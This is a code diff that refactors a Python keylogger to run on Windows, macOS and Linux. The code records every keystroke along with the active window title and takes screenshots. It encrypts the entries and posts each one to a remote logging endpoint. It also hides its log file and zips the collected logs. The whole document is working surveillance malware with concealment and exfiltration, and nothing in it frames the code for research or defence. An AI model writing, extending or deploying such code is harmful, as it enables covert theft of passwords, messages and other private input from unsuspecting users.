@@ -8,22 +8,35 @@ import datetime
 import base64
 import pyaes
 import requests
-import win32gui
-import win32process
+import platform
 import zipfile
-import pyscreenshot as ImageGrab
 import logging
 
 # Key for AES encryption (must be 16, 24, or 32 bytes long)
-AES_KEY = "your_aes_key_here"
+AES_KEY = "your_AES_key_here"  # Replace with your AES key
 
-# Default log directory based on the operating system
-LOG_DIR = os.path.join(os.getenv("APPDATA") if os.name == "nt" else os.getenv("HOME"), "Keylogger")
+# Define platform-specific configurations
+if platform.system() == "Windows":
+    import win32gui
+    import win32process
+    from PIL import ImageGrab as ImageGrab  # PIL is a cross-platform library
+    LOG_DIR = os.path.join(os.getenv("APPDATA"), "Keylogger")  # Windows
+    LOG_FILE_NAME = "keylog.txt"  # Windows
+elif platform.system() == "Darwin":
+    from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
+    from PIL import ImageGrab as ImageGrab  # PIL is a cross-platform library
+    LOG_DIR = os.path.join(os.getenv("HOME"), "Library", "Logs", "Keylogger")  # macOS
+    LOG_FILE_NAME = "keylog.txt"  # macOS
+else:
+    import pyscreenshot as ImageGrab  # pyscreenshot works on Linux
+    LOG_DIR = os.path.join(os.getenv("HOME"), ".keylogger")  # Linux
+    LOG_FILE_NAME = "keylog.txt"  # Linux
 
-# Default log interval in seconds
-LOG_INTERVAL = 60
+LOG_INTERVAL = 60  # Default log interval in seconds
+LAST_LOG_TIME = time.time()
+LOCK = threading.Lock()
 
-# Default remote server URL to send logs
+# Remote server URL to send logs
 REMOTE_URL = 'https://your-vercel-project.vercel.app/api/log_keystrokes'
 
 # Configuration options
@@ -46,36 +59,39 @@ logging.basicConfig(level=logging.INFO,
                         logging.StreamHandler()
                     ])
 
-# AES encryption function
+
 def encrypt(data):
     aes = pyaes.AESModeOfOperationCTR(AES_KEY)
     return aes.encrypt(data)
 
-# AES decryption function
+
 def decrypt(encrypted_data):
     aes = pyaes.AESModeOfOperationCTR(AES_KEY)
     return aes.decrypt(encrypted_data)
 
-# Function to write logs to file and send to server
-def write_to_file(key):
-    try:
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        window_title = ""
-        if CONFIG['logging_application_focus']:
-            window_title = get_active_window_title()
-        log_entry = f"[{timestamp}] [{window_title}] {key}"
-        encrypted_entry = encrypt(log_entry.encode())
-        if CONFIG['encrypted_communication']:
-            send_to_server(base64.b64encode(encrypted_entry).decode())
-        else:
-            send_to_server(encrypted_entry.decode())
-        with open(CONFIG['log_file_location'], "a") as f:
-            f.write(log_entry + '\n')
-        logging.info(log_entry)
-    except Exception as e:
-        logging.error(f"Error writing to file: {e}")
 
-# Function to send logs to the server
+def write_to_file(key):
+    global LAST_LOG_TIME
+    with LOCK:
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            window_title = ""
+            if CONFIG['logging_application_focus']:
+                window_title = get_active_window_title()
+            log_entry = f"[{timestamp}] [{window_title}] {key}"
+            encrypted_entry = encrypt(log_entry.encode())
+            if CONFIG['encrypted_communication']:
+                send_to_server(base64.b64encode(encrypted_entry).decode())
+            else:
+                send_to_server(encrypted_entry.decode())
+            with open(CONFIG['log_file_location'], "a") as f:
+                f.write(log_entry + '\n')
+            LAST_LOG_TIME = time.time()
+            logging.info(log_entry)
+        except Exception as e:
+            logging.error(f"Error writing to file: {e}")
+
+
 def send_to_server(log):
     try:
         response = requests.post(REMOTE_URL, data={'log': log})
@@ -84,7 +100,7 @@ def send_to_server(log):
     except Exception as e:
         logging.error(f"Error sending log to server: {e}")
 
-# Function to create log directory if it doesn't exist
+
 def create_log_dir():
     try:
         if not os.path.exists(LOG_DIR):
@@ -92,25 +108,37 @@ def create_log_dir():
     except Exception as e:
         logging.error(f"Error creating log directory: {e}")
 
-# Function to hide console window
+
 def hide_console():
     try:
-        if os.name == "nt":
+        if platform.system() == "Windows":
             subprocess.call("attrib +h " + os.path.join(LOG_DIR, LOG_FILE_NAME), shell=True)
         else:
-            os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Python\" to false'")
+            # Add code for other platforms if needed
+            pass
     except Exception as e:
         logging.error(f"Error hiding console: {e}")
 
-# Function to get the title of the active window
+
 def get_active_window_title():
-    window = win32gui.GetForegroundWindow()
-    pid = win32process.GetWindowThreadProcessId(window)[1]
-    handle = win32process.OpenProcess(0x0410, False, pid)
-    title = win32gui.GetWindowText(window)
+    if platform.system() == "Windows":
+        window = win32gui.GetForegroundWindow()
+        pid = win32process.GetWindowThreadProcessId(window)[1]
+        handle = win32process.OpenProcess(0x0410, False, pid)
+        title = win32gui.GetWindowText(window)
+    elif platform.system() == "Darwin":
+        window_list = CGWindowListCopyWindowInfo(
+            kCGWindowListOptionOnScreenOnly | kCGNullWindowID)
+        title = ""
+        for window in window_list:
+            title = window.get('kCGWindowOwnerName', '')
+            break
+    else:
+        title = ""
+        # Add code for other platforms if needed
     return title
 
-# Function to capture screenshot
+
 def capture_screenshot():
     try:
         screenshot = ImageGrab.grab()
@@ -119,7 +147,7 @@ def capture_screenshot():
     except Exception as e:
         logging.error(f"Error capturing screenshot: {e}")
 
-# Function to start the keylogger
+
 def start_keylogger():
     try:
         create_log_dir()
@@ -130,14 +158,15 @@ def start_keylogger():
     except Exception as e:
         logging.error(f"Error starting keylogger: {e}")
 
-# Function to check log time and write empty log if interval is reached
+
 def check_log_time():
+    global LAST_LOG_TIME
     while True:
         if time.time() - LAST_LOG_TIME >= CONFIG['log_interval']:
             write_to_file(" ")
         time.sleep(1)
 
-# Function to compress logs into a ZIP file
+
 def compress_logs():
     try:
         with zipfile.ZipFile(os.path.join(LOG_DIR, "logs.zip"), 'w') as zipf:
@@ -147,11 +176,11 @@ def compress_logs():
     except Exception as e:
         logging.error(f"Error compressing logs: {e}")
 
-# Main function
+
 if __name__ == "__main__":
     start_keylogger()
     threading.Thread(target=check_log_time, daemon=True).start()
     if CONFIG['screenshot_capture']:
         threading.Thread(target=capture_screenshot, daemon=True).start()
     if CONFIG['compression']:
-        threading.Thread(target=compress_logs, daemon=True).start()
+        threading.Thread(target=compress_logs, daemon=True).start()  # Fixed function call
